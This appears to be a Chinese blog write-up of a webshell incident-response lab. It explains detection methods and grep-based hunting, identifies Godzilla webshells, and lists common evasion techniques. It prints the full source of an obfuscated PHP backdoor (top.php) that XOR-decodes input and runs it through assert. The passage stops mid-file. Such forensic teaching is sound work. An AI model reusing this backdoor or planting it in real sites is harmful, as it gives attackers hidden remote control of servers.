<h4 id="什么是webshell应急响应"><a href="#什么是webshell应急响应" class="headerlink" title="什么是webshell应急响应"></a>什么是webshell应急响应</h4><p>简单官方一点：WebShell应急响应是指在检测到WebShell（恶意Web脚本）攻击后，采取一系列措施来控制、消除威胁，并恢复受影响的系统和服务。WebShell是一种常见的攻击手段，攻击者通过上传或注入恶意脚本到Web服务器上，从而获得对服务器的远程控制权限，而我们需要做的就是找到问题所在根源并且解决掉它。</p>
<h4 id="常规后门查杀"><a href="#常规后门查杀" class="headerlink" title="常规后门查杀"></a>常规后门查杀</h4><p>1.1、静态检测</p>
<p>我们可以查找一些特殊后缀结尾的文件。例如：.asp、.php、.jsp、.aspx。</p>
<p>然后再从这类文件中查找后门的特征码，特征值，危险函数来查找webshell，例如查找内容含有exec()、eval()、system()的文件。</p>
<p>优点：快速方便，对已知的webshell查找准确率高，部署方便，一个脚本就能搞定。</p>
<p>缺点：漏报率、误报率高，无法查找0day型webshell，而且容易被绕过。</p>
<p>1.2、动态检测</p>
<p>webshell执行时刻表现出来的特征，我们称为动态特征。只要我们把webshell特有的HTTP请求&#x2F;响应做成特征库，加到IDS里面去检测所有的HTTP请求就好了。webshell如果执行系统命令的话，会有进程。Linux下就是起了bash，Win下就是启动cmd，这些都是动态特征。</p>
<p>1.3、日志检测</p>
<p>使用Webshell一般不会在系统日志中留下记录，但是会在网站的web日志中留下Webshell页面的访问数据和数据提交记录。日志分析检测技术通过大量的日志文件建立请求模型从而检测出异常文件，例如：一个平时是GET的请求突然有了POST请求并且返回代码为200。</p>
<p>2、工具排查webshell<br>相对于手工排查，工具排查可能更好上手，但是如果想走的更远一些，某些线下的比赛可能会断网，也就说，手工排查的一些基本操作还是要明白的。（但是工具排查真的很香）</p>
<h4 id="webshell代码特征"><a href="#webshell代码特征" class="headerlink" title="webshell代码特征"></a>webshell代码特征</h4><ul>
<li>可疑函数调用</li>
</ul>
<p>WebShell通常会使用一些危险的函数来执行系统命令或代码，如：</p>
<p>PHP: eval(), system(), exec(), shell_exec(), passthru(), assert(), base64_decode()</p>
<p>ASP: Execute(), Eval(), CreateObject()</p>
<p>JSP: Runtime.getRuntime().exec()</p>
<ul>
<li>编码和解码</li>
</ul>
<p>WebShell经常使用编码和解码技术来隐藏其真实意图，如Base64编码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;encoded_string&#x27;</span>));</span><br></pre></td></tr></table></figure>

<ul>
<li>文件操作</li>
</ul>
<p>WebShell可能会包含文件操作函数，用于读取、写入或修改文件：</p>
<p>PHP: fopen(), fwrite(), file_get_contents(), file_put_contents()</p>
<p>ASP: FileSystemObject</p>
<ul>
<li>网络操作</li>
</ul>
<p>WebShell可能会包含网络操作函数，用于与远程服务器通信：<br>PHP: fsockopen(), curl_exec(), file_get_contents(‘http:&#x2F;&#x2F;…’)<br>ASP: WinHttp.WinHttpRequest</p>
<h4 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h4><h5 id="问题1-黑客webshell里面的flag"><a href="#问题1-黑客webshell里面的flag" class="headerlink" title="问题1:黑客webshell里面的flag"></a>问题1:黑客webshell里面的flag</h5><p>这道题应该是让我们先找出webshell</p>
<p>我们直接使用find命令查找特殊后缀的文件，然后管道符拼接xargs去匹配特征函数，xargs函数就是把命令1的结果当作输入给到命令2。</p>
<p>上面刚刚也说了我们可以尝试定位一些特殊的后缀文件，例如：.asp、.php、.jsp、.aspx。</p>
<p>我们先进入网站的运行目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html</span><br></pre></td></tr></table></figure>

<p>但是在html目录下看到了可疑的shell.php</p>
<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421145708879.png" alt="image-20250421145708879"></p>
<p>不过这是意外惊喜，我们还是得用命令去检索一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//搜索目录下适配当前应用的网页文件，查看内容是否有Webshell特征</span></span><br><span class="line">find ./ -name <span class="string">&quot;*.jsp&quot;</span> | xargs grep <span class="string">&quot;exec(&quot;</span> </span><br><span class="line">find ./ -name <span class="string">&quot;*.php&quot;</span> | xargs grep <span class="string">&quot;eval(&quot;</span> </span><br><span class="line">find ./ -name <span class="string">&quot;*.asp&quot;</span> | xargs grep <span class="string">&quot;execute(&quot;</span> </span><br><span class="line">find ./ -name <span class="string">&quot;*.aspx&quot;</span> | xargs grep <span class="string">&quot;eval(&quot;</span> </span><br><span class="line">    </span><br><span class="line"><span class="comment">//对于免杀Webshell，可以查看是否使用编码</span></span><br><span class="line">find ./ type f -name <span class="string">&quot;*.php&quot;</span> | xargs grep <span class="string">&quot;base64_decode&quot;</span> </span><br></pre></td></tr></table></figure>

<p>代码解释:</p>
<p><code>xargs</code>：xargs命令用于将输入数据重新格式化后作为参数传递给其他命令。在这个命令中，xargs将find命令找到的文件列表作为参数传递给grep命令。</p>
<p><code>grep &quot;eval(&quot;</code>：grep命令用于搜索文本，并输出匹配的行。这里”<code>eval(</code>“是grep命令的搜索模式，用于查找包含<code>eval(</code>字符串的行</p>
<p>所以运行出来的结果是</p>
<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421150114386.png" alt="image-20250421150114386"></p>
<p>然后依次cat一下这三个文件</p>
<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421150308847.png" alt="image-20250421150308847"></p>
<p>发现这里有被注释掉的，应该是flag，不放心的话我们可以再把其他几个文件cat查看一下</p>
<h5 id="问题二-黑客使用的什么工具的shell"><a href="#问题二-黑客使用的什么工具的shell" class="headerlink" title="问题二:黑客使用的什么工具的shell"></a>问题二:黑客使用的什么工具的shell</h5><p>遇到这种类型，意思就是让我们分析一下是什么类型的webshell，其实我们已经可以猜测出是godzilla的webshell了</p>
<p>为什么这么说</p>
<p>哥斯拉病毒是一种Java后门木马，通常用于攻击并控制<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Web%E6%9C%8D%E5%8A%A1%E5%99%A8&spm=1001.2101.3001.7020">Web服务器</a>。特征就包括：</p>
<blockquote>
<ol>
<li><strong>@session_start();</strong> - 开启一个会话。</li>
<li><strong>@set_time_limit(0);</strong> - 设置脚本执行时间为无限。</li>
<li><strong>@error_reporting(0);</strong> - 关闭所有错误报告。</li>
</ol>
</blockquote>
<p>这些代码行主要用于隐藏病毒活动并确保其能够长时间运行而不被发现。哥斯拉病毒通常会通过Webshell或其他漏洞注入到服务器中，然后使用这些命令来掩盖其存在并执行进一步的恶意操作。</p>
<p>并且<strong>哥斯拉的shell通常都会采用base64加密和异或算法的方法去加密数据</strong></p>
<p>所以我们只需要找到它的github地址并且进行MD5加密即可；</p>
<blockquote>
<p>Godzilla地址：<a target="_blank" rel="noopener" href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></p>
</blockquote>
<p>文件内容中看到开头的三句就是哥斯拉的典型特征</p>
<p>最终加密出来的flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;39392de3218c333f794befef07ac9257&#125;</span><br></pre></td></tr></table></figure>

<h5 id="问题3-黑客隐藏shell的完整路径"><a href="#问题3-黑客隐藏shell的完整路径" class="headerlink" title="问题3:黑客隐藏shell的完整路径"></a>问题3:黑客隐藏shell的完整路径</h5><p>既然说是黑客隐藏的shell了，那我们就需要用到ls -a进行查找</p>
<h6 id="ls和ls-a和ls-l的区别"><a href="#ls和ls-a和ls-l的区别" class="headerlink" title="ls和ls -a和ls -l的区别"></a>ls和ls -a和ls -l的区别</h6><p><code>ls</code></p>
<ul>
<li><strong>功能</strong>: 列出当前目录或指定目录中的文件和文件夹。</li>
<li><strong>输出</strong>: 默认情况下，<code>ls</code> 不会显示以点（<code>.</code>）开头的隐藏文件。这些文件通常是系统配置文件或隐藏的文件。</li>
</ul>
<p><code>ls -a</code></p>
<ul>
<li><strong>功能</strong>: 列出当前目录或指定目录中的所有文件和文件夹，包括隐藏文件。</li>
<li><strong>输出</strong>: <code>ls -a</code> 会显示所有文件，包括以点（<code>.</code>）开头的文件（隐藏文件）。此外，它还会显示两个特殊的目录：<code>.</code>（当前目录）和 <code>..</code>（上级目录）。</li>
</ul>
<p><strong>ls  -l</strong></p>
<ul>
<li><code>ls -l</code> 是 Linux 和 Unix 系统中用于列出目录内容的命令之一，它以详细的格式显示文件和目录的信息。与普通的 <code>ls</code> 命令相比，<code>ls -l</code> 提供了更多的文件属性信息</li>
</ul>
<p>ls -l&#96; 输出的内容包括以下信息：</p>
<ol>
<li><strong>文件类型和权限</strong>：第一个字符表示文件类型（如 <code>-</code> 表示普通文件，<code>d</code> 表示目录，<code>l</code> 表示符号链接等），接下来的九个字符表示文件的权限（如 <code>rwxr-xr-x</code>）。</li>
<li><strong>硬链接数</strong>：显示文件的硬链接数量。</li>
<li><strong>所有者</strong>：显示文件的所有者用户名。</li>
<li><strong>用户组</strong>：显示文件所属的用户组。</li>
<li><strong>文件大小</strong>：以字节为单位显示文件的大小。</li>
<li><strong>最后修改时间</strong>：显示文件的最后修改日期和时间。</li>
<li><strong>文件名</strong>：最后显示文件或目录的名称。</li>
</ol>
<p>那我们就进入着三个文件的路径中逐个排查一下，然后在&#x2F;var&#x2F;www&#x2F;html&#x2F;include&#x2F;Db目录下看到有隐藏的木马</p>
<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421151015712.png" alt="image-20250421151015712"></p>
<p>这里可以发现执行ls和ls -a是不一样的，出现了.Mysqli.php文件</p>
<p>cat查看一下</p>
<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421151059651.png" alt="image-20250421151059651"></p>
<p>一个一样的哥斯拉的shell木马，猜测应该是隐藏的webshell了，我们拿路径去md5加密就可以了</p>
<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421151214183.png" alt="image-20250421151214183"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;aebac0e58cd6c5fad1695ee4d1ac1919&#125;</span><br></pre></td></tr></table></figure>

<h5 id="问题4-黑客免杀马完整路径"><a href="#问题4-黑客免杀马完整路径" class="headerlink" title="问题4:黑客免杀马完整路径"></a>问题4:黑客免杀马完整路径</h5><h6 id="什么是免杀马"><a href="#什么是免杀马" class="headerlink" title="什么是免杀马"></a>什么是免杀马</h6><p>免杀马（免杀病毒或免杀Webshell）是指<strong>经过特殊处理和混淆</strong>，使其能够避开杀毒软件和安全检测工具识别的恶意软件或后门程序。黑客使用各种技术手段，使恶意代码看起来像是正常代码，从而躲避签名检测和基于规则的安全机制。这种技术通常用于Webshell和其他后门程序，目的是保持对受害系统的隐蔽访问。</p>
<h6 id="常见的免杀技术"><a href="#常见的免杀技术" class="headerlink" title="常见的免杀技术"></a>常见的免杀技术</h6><ul>
<li>代码混淆：</li>
</ul>
<p>使用混淆工具或手动混淆代码，使其难以被直接阅读和分析。</p>
<ul>
<li>编码和加密：</li>
</ul>
<p>使用Base64、ROT13等编码方式或更复杂的加密技术隐藏恶意代码片段。</p>
<ul>
<li>动态生成和执行：</li>
</ul>
<p>通过动态生成代码并在运行时执行，绕过静态分析。例如，使用 eval()、create_function() 等PHP函数。</p>
<ul>
<li>多层解码：</li>
</ul>
<p>多层编码或加密，增加分析和检测的难度。</p>
<ul>
<li>使用合法函数：</li>
</ul>
<p>恶意代码嵌入到看似合法的代码中，利用正常的函数调用执行恶意操作。</p>
<h6 id="查找和处理免杀马的方法；"><a href="#查找和处理免杀马的方法；" class="headerlink" title="查找和处理免杀马的方法；"></a>查找和处理免杀马的方法；</h6><ul>
<li>文件完整性检查：</li>
</ul>
<p>比较当前文件与已知的良性备份文件，发现被修改或新增的文件。</p>
<ul>
<li>代码审查：</li>
</ul>
<p>手动检查可疑文件，寻找混淆、编码、加密和动态执行的代码模式。</p>
<ul>
<li>安全扫描工具：</li>
</ul>
<p>使用高级安全扫描工具，这些工具使用行为分析和机器学习来检测潜在的免杀马。</p>
<ul>
<li>日志分析：</li>
</ul>
<p>查看服务器访问日志和错误日志，寻找异常访问和执行模式。</p>
<p>检查文件修改时间，与正常更新周期不符的文件可能是可疑的。</p>
<ul>
<li>基于特征的检测：</li>
</ul>
<p>使用YARA规则等特征检测工具，根据已知的免杀马特征进行扫描。</p>
<p>既然它经过了免杀处理，那么木马的特征值以及特征函数应该都是被去掉了。这时我们再通过静态检测是基本检测不到的，从上面我们就可以看出我们只找到了三个马。而且上面我们说了webshell执行会在网站日志留下记录，那我们就到网站日志里面看看有啥可疑的记录。</p>
<h6 id="windows上的网站日志路径"><a href="#windows上的网站日志路径" class="headerlink" title="windows上的网站日志路径"></a>windows上的网站日志路径</h6><ul>
<li>IIS（Internet Information Services）</li>
</ul>
<p>IIS是Windows上的默认Web服务器，其日志文件默认存储在以下路径：</p>
<ul>
<li>IIS 6.0 及更早版本：</li>
</ul>
<p>C:\WINDOWS\system32\LogFiles\W3SVC[SiteID]\</p>
<ul>
<li>IIS 7.0 及更高版本：</li>
</ul>
<p>C:\inetpub\logs\LogFiles\W3SVC[SiteID]\</p>
<p>其中，[SiteID] 是网站的标识符，通常是一个数字。</p>
<ul>
<li>Apache HTTP Server</li>
</ul>
<p>如果在Windows上安装了Apache，日志文件默认存储在安装目录下的logs文件夹中：</p>
<p>C:\Program Files (x86)\Apache Group\Apache2\logs\</p>
<p>或者</p>
<p>C:\Program Files\Apache Group\Apache2\logs\</p>
<p>具体路径取决于安装时选择的位置。</p>
<ul>
<li><p>Linux系统中的网站日志路径</p>
</li>
<li><p>Apache HTTP Server</p>
</li>
</ul>
<p>在Linux上，Apache日志文件通常位于以下目录：</p>
<p>访问日志：</p>
<p>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</p>
<p>或者</p>
<p>&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access_log</p>
<p>错误日志：</p>
<p>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;error.log</p>
<p>或</p>
<p>&#x2F;var&#x2F;log&#x2F;httpd&#x2F;error_log</p>
<p>不同的Linux发行版可能有不同的目录。例如，在Debian&#x2F;Ubuntu上通常使用&#x2F;var&#x2F;log&#x2F;apache2&#x2F;，而在Red Hat&#x2F;CentOS上通常使用&#x2F;var&#x2F;log&#x2F;httpd&#x2F;。</p>
<ul>
<li>Nginx</li>
</ul>
<p>Nginx是另一个流行的Web服务器，默认的日志文件路径如下：</p>
<p>访问日志：</p>
<p>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
<p>错误日志：</p>
<p>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</p>
<h6 id="如何查看和分析日志文件？"><a href="#如何查看和分析日志文件？" class="headerlink" title="如何查看和分析日志文件？"></a>如何查看和分析日志文件？</h6><p>Windows：</p>
<p>使用文本编辑器（如Notepad、Notepad++）直接打开日志文件查看。<br>可以使用IIS管理器查看IIS日志。<br>Linux：</p>
<p>使用命令行工具查看日志，例如：</p>
<p>tail -f &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log </p>
<p>tail -f &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
<p>可以使用日志分析工具（如GoAccess、AWStats）生成可视化的日志报告。</p>
<p>接下来我们就进入日志文件的排查(因为我是另一种方法，所以这里直接搬大佬的过程)</p>
<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421151550443.png" alt="image-20250421151550443"></p>
<p>我们到apache2目录下面查看一下access.log日志，查看分析一下</p>
<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421151821603.png" alt="image-20250421151821603"></p>
<p>这里是上传了一个shell.php并且访问成功，说明这里上传成功了</p>
<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421152032064.png" alt="image-20250421152032064"></p>
<p>我们可以看到有个名为top.php的文件和index.php文件执行了phpinfo()；且返回值为200，有点可疑。去翻一下呢</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//top.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span> = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ERsDHgEUC1hI</span></span><br><span class="line"><span class="variable">$fun</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>]);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$fun</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$fun</span>[<span class="variable">$i</span>] = <span class="variable">$fun</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">7</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;a&quot;</span>;</span><br><span class="line"><span class="variable">$s</span> = <span class="string">&quot;s&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$a</span>.<span class="variable">$s</span>.<span class="variable">$_GET</span>[<span class="string">&quot;func2&quot;</span>];</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$fun</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//inde.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;../config.php&quot;</span>;</span><br><span class="line"><span class="comment">//载入公共变量</span></span><br><span class="line"><span class="keyword">include</span> SYS_ROOT.INC.<span class="string">&quot;common.php&quot;</span>;</span><br><span class="line"><span class="comment">//数据处理</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$dbit</span>=<span class="keyword">new</span> <span class="title class_">Dbclass</span>(SYS_ROOT.DB_NAME);</span><br><span class="line"><span class="variable">$id</span>=<span class="title class_">Base</span>::<span class="title function_ invoke__">safeword</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>],<span class="number">1</span>);</span><br><span class="line"><span class="variable">$page</span>=<span class="title class_">Base</span>::<span class="title function_ invoke__">safeword</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>],<span class="number">1</span>);</span><br><span class="line"><span class="variable">$eachpage</span>=EACHPAGE;</span><br><span class="line"><span class="variable">$cat</span>=<span class="title class_">Base</span>::<span class="title function_ invoke__">safeword</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cat&#x27;</span>],<span class="number">1</span>);</span><br><span class="line"><span class="variable">$name</span>=<span class="title class_">Base</span>::<span class="title function_ invoke__">safeword</span>( <span class="title class_">Base</span>::<span class="title function_ invoke__">safeword</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>],<span class="number">3</span>),<span class="number">5</span>);</span><br><span class="line"><span class="variable">$comment</span>=<span class="title class_">Base</span>::<span class="title function_ invoke__">safeword</span>( <span class="title class_">Base</span>::<span class="title function_ invoke__">safeword</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;comment&#x27;</span>] , <span class="number">3</span> ) , <span class="number">5</span>);</span><br><span class="line"><span class="variable">$article_id</span>=<span class="title class_">Base</span>::<span class="title function_ invoke__">safeword</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;article_id&#x27;</span>],<span class="number">1</span>);</span><br><span class="line"><span class="comment">//配置说明</span></span><br><span class="line"><span class="variable">$webname</span>=WEBNAME;</span><br><span class="line"><span class="variable">$webinfo</span>=WEBINFO;</span><br><span class="line"><span class="variable">$weburl</span>=WEBURL;</span><br><span class="line"><span class="comment">//公告</span></span><br><span class="line"><span class="variable">$announce</span>=ANNOUNCE;</span><br><span class="line"><span class="comment">//直接用数组缓存</span></span><br><span class="line"><span class="keyword">include</span>(SYS_ROOT.CACHE.<span class="string">&quot;cat_array.inc&quot;</span>);</span><br><span class="line"><span class="comment">//文章页参数缓存</span></span><br><span class="line"><span class="keyword">include</span>(SYS_ROOT.CACHE.<span class="string">&quot;art_array.inc&quot;</span>);</span><br><span class="line"><span class="variable">$mobile</span>=<span class="title class_">Base</span>::<span class="title function_ invoke__">safeword</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mobile&#x27;</span>],<span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$mobile</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$name</span>==<span class="string">&#x27;&#x27;</span>||<span class="variable">$comment</span>==<span class="string">&#x27;&#x27;</span>)<span class="keyword">die</span>(<span class="string">&#x27;Please input your name and comment correctly!&lt;a href=&quot;?id=&#x27;</span>.<span class="variable">$article_id</span>.<span class="string">&#x27;&quot;&gt;Back&lt;/a&gt;&#x27;</span>);</span><br><span class="line">        <span class="variable">$tmp</span>[<span class="string">&#x27;article_id&#x27;</span>]=<span class="variable">$article_id</span>;</span><br><span class="line">        <span class="variable">$tmp</span>[<span class="string">&#x27;name&#x27;</span>]=<span class="title class_">Base</span>::<span class="title function_ invoke__">safeword</span>(<span class="variable">$name</span>,<span class="number">4</span>);</span><br><span class="line">        <span class="variable">$tmp</span>[<span class="string">&#x27;emails&#x27;</span>]=<span class="string">&#x27;ok@ok.com&#x27;</span>;</span><br><span class="line">        <span class="variable">$tmp</span>[<span class="string">&#x27;content&#x27;</span>]=<span class="title class_">Base</span>::<span class="title function_ invoke__">safeword</span>(<span class="variable">$comment</span>,<span class="number">5</span>);</span><br><span class="line">        <span class="variable">$tmp</span>[<span class="string">&#x27;ips&#x27;</span>]=<span class="title class_">Base</span>::<span class="title function_ invoke__">realip</span>();</span><br><span class="line">        <span class="variable">$tmp</span>[<span class="string">&#x27;times&#x27;</span>]=<span class="title class_">Base</span>::<span class="title function_ invoke__">getnowtime</span>();</span><br><span class="line">        <span class="variable">$data</span>[<span class="string">&#x27;status&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="variable">$addstatus</span>=<span class="variable">$dbit</span>-&gt;<span class="title function_ invoke__">add_one</span>(TB.<span class="string">&quot;comment&quot;</span>,<span class="variable">$tmp</span>);</span><br><span class="line">        <span class="variable">$dbit</span>-&gt;<span class="title function_ invoke__">updatelist</span>(TB.<span class="string">&quot;cms&quot;</span>,<span class="string">&quot;cmtcount=cmtcount+1&quot;</span>,<span class="variable">$tmp</span>[<span class="string">&#x27;article_id&#x27;</span>]);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;^_^Submit Succefully!&lt;a href=&quot;?id=&#x27;</span>.<span class="variable">$article_id</span>.<span class="string">&#x27;&quot;&gt;GO ON!&lt;/a&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$id</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//上一篇</span></span><br><span class="line">        <span class="variable">$upart</span>=<span class="variable">$dbit</span>-&gt;<span class="title function_ invoke__">get_one</span>(TB.<span class="string">&quot;cms&quot;</span>,<span class="string">&quot;status=1 and id&lt;&quot;</span>.(<span class="variable">$id</span>),<span class="string">&quot;id,name&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//下一篇</span></span><br><span class="line">        <span class="variable">$downart</span>=<span class="variable">$dbit</span>-&gt;<span class="title function_ invoke__">get_one</span>(TB.<span class="string">&quot;cms&quot;</span>,<span class="string">&quot;status=1 and id&gt;&quot;</span>.(<span class="variable">$id</span>),<span class="string">&quot;id,name&quot;</span>,<span class="number">1</span>,<span class="string">&#x27;id ASC&#x27;</span>);</span><br><span class="line">        <span class="comment">//评论</span></span><br><span class="line">        <span class="variable">$commenttotal</span>=<span class="variable">$dbit</span>-&gt;<span class="title function_ invoke__">get_one</span>(TB.<span class="string">&quot;comment&quot;</span>,<span class="string">&quot;status=1 and article_id=&quot;</span>.(<span class="variable">$id</span>),<span class="string">&quot;count(*)&quot;</span>);</span><br><span class="line">        <span class="variable">$cmtotal</span>=<span class="variable">$commenttotal</span>[<span class="string">&#x27;count(*)&#x27;</span>];</span><br><span class="line">        <span class="variable">$comments</span>=<span class="variable">$dbit</span>-&gt;<span class="title function_ invoke__">getlist</span>(TB.<span class="string">&quot;comment&quot;</span>,<span class="string">&quot;status=1 and article_id=&quot;</span>.(<span class="variable">$id</span>),<span class="string">&quot;*&quot;</span>);</span><br><span class="line">        <span class="variable">$atl</span>=<span class="variable">$dbit</span>-&gt;<span class="title function_ invoke__">get_one</span>(TB.<span class="string">&quot;cms&quot;</span>,<span class="string">&quot;status=1 and id=&quot;</span>.<span class="variable">$id</span>,<span class="string">&quot;*&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="variable">$addtitle</span>=<span class="variable">$atl</span>[<span class="string">&#x27;name&#x27;</span>]?<span class="variable">$atl</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;_&quot;</span>:<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable">$tpl</span> = <span class="keyword">new</span> <span class="title class_">Template</span>();</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$tpl</span>-&gt;<span class="title function_ invoke__">myTpl</span>(<span class="string">&#x27;wap_display&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;$tpl&#x27;</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//评论</span></span><br><span class="line">        <span class="variable">$recnetcmts</span>=<span class="variable">$dbit</span>-&gt;<span class="title function_ invoke__">getlist</span>(TB.<span class="string">&quot;comment&quot;</span>,<span class="string">&#x27;status=1&#x27;</span>,<span class="string">&quot;content,article_id,name&quot;</span>,<span class="number">10</span>);</span><br><span class="line">        <span class="variable">$total</span>=<span class="variable">$articleData</span>[<span class="string">&#x27;count&#x27;</span>];</span><br><span class="line">        <span class="variable">$indexs</span>=<span class="string">&#x27;wap_index&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$cat</span>)&#123;</span><br><span class="line">                <span class="variable">$totaldata</span>=<span 